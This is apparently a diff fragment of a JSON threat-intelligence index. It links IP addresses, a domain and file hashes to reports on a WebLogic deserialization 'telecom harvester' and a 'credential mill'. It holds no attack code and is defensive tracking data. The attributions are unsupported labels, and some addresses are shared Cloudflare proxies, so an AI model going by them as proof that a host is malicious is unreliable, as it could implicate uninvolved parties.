+  "ipv4:47.130.108.237": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "ipv4:2.57.91.91": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "ipv4:104.21.41.159": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Cloudflare proxy A record for radius-sync.com"
+   }
+  ],
+  "ipv4:172.67.148.55": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Cloudflare proxy A record for radius-sync.com"
    }
   ],
   "sha256:3aa45ceff7070ae6d183c5aa5f0d771a79c7cf37fe21a3906df976bee497bf20": [
@@ -9806,6 +10556,11 @@
    }
   ],
   "domain:goldxstar.com": [
+   {
+    "report": "russian-gemini-credential-mill-213.165.51.115"
+   }
+  ],
+  "sha256:981036cec38c6fd9796fc64a102100b97983f56b3482cc3e1f1610e14a1fae58": [
    {
     "report": "russian-gemini-credential-mill-213.165.51.115"
    }
